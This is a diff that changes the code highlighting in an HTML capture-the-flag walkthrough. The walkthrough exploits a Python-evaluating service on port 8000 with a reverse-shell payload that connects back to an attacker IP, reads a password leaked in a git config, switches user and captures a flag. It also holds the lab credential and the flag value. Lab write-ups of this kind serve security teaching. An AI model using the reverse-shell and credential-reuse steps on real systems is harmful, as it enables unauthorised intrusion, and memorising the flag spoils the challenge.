@@ -78,16 +78,16 @@
 <blockquote>
 <p>Run the aggressive/full-port Nmap scan used:</p>
 </blockquote>
-<pre class="codehilite"><code class="language-bash">nmap -T4 -n -sC -sV -Pn -p- 10.201.87.78
-</code></pre>
+<div class="codehilite"><pre><span></span><code>nmap<span class="w"> </span>-T4<span class="w"> </span>-n<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-Pn<span class="w"> </span>-p-<span class="w"> </span><span class="m">10</span>.201.87.78
+</code></pre></div>
 
 <blockquote>
 <p>Key relevant output (abridged):</p>
 </blockquote>
-<pre class="codehilite"><code>PORT     STATE SERVICE  VERSION
-22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
-8000/tcp open  http-alt SimpleHTTP/0.6 Python/3.11.2
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="nx">PORT</span><span class="w">     </span><span class="nx">STATE</span><span class="w"> </span><span class="nx">SERVICE</span><span class="w">  </span><span class="nx">VERSION</span>
+<span class="mi">22</span><span class="o">/</span><span class="nx">tcp</span><span class="w">   </span><span class="nx">open</span><span class="w">  </span><span class="nx">ssh</span><span class="w">      </span><span class="nx">OpenSSH</span><span class="w"> </span><span class="m m-Double">8.2</span><span class="nx">p1</span><span class="w"> </span><span class="nx">Ubuntu</span><span class="w"> </span><span class="mi">4</span><span class="nx">ubuntu0</span><span class="m m-Double">.13</span>
+<span class="mi">8000</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">http</span><span class="o">-</span><span class="nx">alt</span><span class="w"> </span><span class="nx">SimpleHTTP</span><span class="o">/</span><span class="m m-Double">0.6</span><span class="w"> </span><span class="nx">Python</span><span class="o">/</span><span class="m m-Double">3.11.2</span>
+</code></pre></div>
 
 <blockquote>
 <p>Nmap indicates a Python SimpleHTTP server on port 8000. It also shows odd fingerprint responses that suggest the service executes or interprets input (error messages containing <code>name 'GET' is not defined</code>, etc.). This hints a Python REPL-like behaviour behind the HTTP interface.</p>
@@ -95,22 +95,22 @@
 <hr />
 <h2>2) Probe the web service</h2>
 <p>Quick check with <code>curl</code>:</p>
-<pre class="codehilite"><code class="language-bash">curl -v 10.201.87.78:8000
-</code></pre>
+<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-v<span class="w"> </span><span class="m">10</span>.201.87.78:8000
+</code></pre></div>
 
 <p>Returned a <code>200 OK</code> from <code>SimpleHTTP/0.6 Python/3.11.2</code>, but the HTML body was minimal.</p>
 <p>Next, try a raw TCP connection with <code>nc</code> to interactively probe what the server expects:</p>
-<pre class="codehilite"><code class="language-bash">nc 10.201.87.78 8000 -v
-</code></pre>
+<div class="codehilite"><pre><span></span><code>nc<span class="w"> </span><span class="m">10</span>.201.87.78<span class="w"> </span><span class="m">8000</span><span class="w"> </span>-v
+</code></pre></div>
 
 <p>When you type expressions you see Python-style responses, for example:</p>
-<pre class="codehilite"><code>1+1
-# =&gt; (server responds)
-whoami
-# =&gt; name 'whoami' is not defined
-ls
-# =&gt; name 'ls' is not defined
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="mf">1</span><span class="o">+</span><span class="mf">1</span>
+<span class="err">#</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">(</span><span class="n">server</span><span class="w"> </span><span class="n">responds</span><span class="p">)</span>
+<span class="n">whoami</span>
+<span class="err">#</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="err">&#39;</span><span class="n">whoami</span><span class="err">&#39;</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="kd">def</span><span class="n">ined</span>
+<span class="n">ls</span>
+<span class="err">#</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="err">&#39;</span><span class="n">ls</span><span class="err">&#39;</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="kd">def</span><span class="n">ined</span>
+</code></pre></div>
 
 <p>So the remote side is evaluating Python code strings — not a normal web app. That allows arbitrary Python execution.</p>
 <hr />
@@ -118,27 +118,27 @@ ls
 <blockquote>
 <p>Because we can evaluate Python, execute a reverse-shell one-liner from the host back to our machine. On your attacker (Kali) machine start a listener:</p>
 </blockquote>
-<pre class="codehilite"><code class="language-bash">nc -lvnp 4445
-</code></pre>
+<div class="codehilite"><pre><span></span><code>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4445</span>
+</code></pre></div>
 
 <blockquote>
 <p>Then send this payload via the TCP connection to the service (example payload used here):</p>
 </blockquote>
-<pre class="codehilite"><code class="language-python">import socket,subprocess,os;
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
-s.connect((&quot;10.21.16.42&quot;,4445));
-os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
-import pty; pty.spawn(&quot;/bin/bash&quot;)
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span><span class="nn">subprocess</span><span class="o">,</span><span class="nn">os</span><span class="p">;</span>
+<span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">);</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s2">&quot;10.21.16.42&quot;</span><span class="p">,</span><span class="mi">4445</span><span class="p">));</span>
+<span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">);</span> <span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">);</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">);</span>
+<span class="kn">import</span> <span class="nn">pty</span><span class="p">;</span> <span class="n">pty</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="s2">&quot;/bin/bash&quot;</span><span class="p">)</span>
+</code></pre></div>
 
 <p><strong>Notes:</strong> adjust the IP <code>10.21.16.42</code> to your attack box IP. The service executed the payload and connected back. Listener output shows a connection from <code>10.201.87.78</code> and you receive a <code>www-data</code> shell.</p>
 <blockquote>
 <p>You may see <code>bash: /root/.bashrc: Permission denied</code> — ignore that. To stabilize the shell run:</p>
 </blockquote>
-<pre class="codehilite"><code class="language-bash">SHELL=/bin/bash script -q /dev/null
-# or
-stty raw -echo &amp;&amp; fg
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="nv">SHELL</span><span class="o">=</span>/bin/bash<span class="w"> </span>script<span class="w"> </span>-q<span class="w"> </span>/dev/null
+<span class="c1"># or</span>
+stty<span class="w"> </span>raw<span class="w"> </span>-echo<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">fg</span>
+</code></pre></div>
 
 <blockquote>
 <p>Now you have an interactive shell as <code>www-data</code>.</p>
@@ -146,19 +146,19 @@ stty raw -echo &amp;&amp; fg
 <hr />
 <h2>4) Initial discovery on target (post-exploit)</h2>
 <p>Once on the box as <code>www-data</code>:</p>
-<pre class="codehilite"><code class="language-bash">cd /opt/dev
-ls -la
-# reveals a .git directory
-cd .git
-ls -la
-cat config
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="nb">cd</span><span class="w"> </span>/opt/dev
+ls<span class="w"> </span>-la
+<span class="c1"># reveals a .git directory</span>
+<span class="nb">cd</span><span class="w"> </span>.git
+ls<span class="w"> </span>-la
+cat<span class="w"> </span>config
+</code></pre></div>
 
 <p><code>/opt/dev/.git/config</code> contained:</p>
-<pre class="codehilite"><code>[credential &quot;https://github.com&quot;]
-    username = think
-    password = _TH1NKINGPirate$_
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="k">[credential &quot;https://github.com&quot;]</span>
+<span class="w">    </span><span class="na">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">think</span>
+<span class="w">    </span><span class="na">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">_TH1NKINGPirate$_</span>
+</code></pre></div>
 
 <p>This is a clear credential disclosure in the repository config.</p>
 <hr />
@@ -167,19 +167,19 @@ cat config
 <p>The password from the git config was used to switch to the <code>think</code> account locally.</p>
 <p>From the <code>www-data</code> shell:</p>
 </blockquote>
-<pre class="codehilite"><code class="language-bash">su - think
-# enter password: _TH1NKINGPirate$_
-</code></pre>
+<div class="codehilite"><pre><span></span><code>su<span class="w"> </span>-<span class="w"> </span>think
+<span class="c1"># enter password: _TH1NKINGPirate$_</span>
+</code></pre></div>
 
 <blockquote>
 <p>You are now <code>think</code>.</p>
 <p>Check home and read the user flag:</p>
 </blockquote>
-<pre class="codehilite"><code class="language-bash">cd ~
-ls -lah
-cat user.txt
-# 996bdb1f619a68361417cabca5454705
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="nb">cd</span><span class="w"> </span>~
+ls<span class="w"> </span>-lah
+cat<span class="w"> </span>user.txt
+<span class="c1"># 996bdb1f619a68361417cabca5454705</span>
+</code></pre></div>
 
 <blockquote>
 <p>Flag captured: <code>996bdb1f619a68361417cabca5454705</code>.</p>
@@ -200,34 +200,34 @@ cat user.txt
 </ul>
 <hr />
 <h2>7) Commands &amp; quick cheat-sheet</h2>
-<pre class="codehilite"><code class="language-bash"># Recon
-nmap -T4 -n -sC -sV -Pn -p- 10.201.87.78
+<div class="codehilite"><pre><span></span><code><span class="c1"># Recon</span>
+nmap<span class="w"> </span>-T4<span class="w"> </span>-n<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-Pn<span class="w"> </span>-p-<span class="w"> </span><span class="m">10</span>.201.87.78
 
-# Probe
-curl -v 10.201.87.78:8000
-nc 10.201.87.78 8000 -v
+<span class="c1"># Probe</span>
+curl<span class="w"> </span>-v<span class="w"> </span><span class="m">10</span>.201.87.78:8000
+nc<span class="w"> </span><span class="m">10</span>.201.87.78<span class="w"> </span><span class="m">8000</span><span class="w"> </span>-v
 
-# Reverse shell (listener on attacker)
-nc -lvnp 4445
+<span class="c1"># Reverse shell (listener on attacker)</span>
+nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4445</span>
 
-# Payload (send into the REPL/connection)
-# adjust attacker IP
-import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.21.16.42&quot;,4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)
+<span class="c1"># Payload (send into the REPL/connection)</span>
+<span class="c1"># adjust attacker IP</span>
+import<span class="w"> </span>socket,subprocess,os<span class="p">;</span><span class="nv">s</span><span class="o">=</span>socket.socket<span class="o">(</span>socket.AF_INET,socket.SOCK_STREAM<span class="o">)</span><span class="p">;</span>s.connect<span class="o">((</span><span class="s2">&quot;10.21.16.42&quot;</span>,4445<span class="o">))</span><span class="p">;</span>os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,0<span class="o">)</span><span class="p">;</span><span class="w"> </span>os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,1<span class="o">)</span><span class="p">;</span>os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,2<span class="o">)</span><span class="p">;</span>import<span class="w"> </span>pty<span class="p">;</span><span class="w"> </span>pty.spawn<span class="o">(</span><span class="s2">&quot;/bin/bash&quot;</span><span class="o">)</span>
 
-# Stabilize shell on connect
-SHELL=/bin/bash script -q /dev/null
-# or
-stty raw -echo &amp;&amp; fg
+<span class="c1"># Stabilize shell on connect</span>
+<span class="nv">SHELL</span><span class="o">=</span>/bin/bash<span class="w"> </span>script<span class="w"> </span>-q<span class="w"> </span>/dev/null
+<span class="c1"># or</span>
+stty<span class="w"> </span>raw<span class="w"> </span>-echo<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">fg</span>
 
-# Look for git and credentials
-cd /opt/dev/.git
-cat config
+<span class="c1"># Look for git and credentials</span>
+<span class="nb">cd</span><span class="w"> </span>/opt/dev/.git
+cat<span class="w"> </span>config
 
-# Use credential
-su - think
-# password: _TH1NKINGPirate$_
-cat ~/user.txt
-</code></pre>
+<span class="c1"># Use credential</span>
+su<span class="w"> </span>-<span class="w"> </span>think
+<span class="c1"># password: _TH1NKINGPirate$_</span>
+cat<span class="w"> </span>~/user.txt
+</code></pre></div>
 
 <hr />
 <hr />
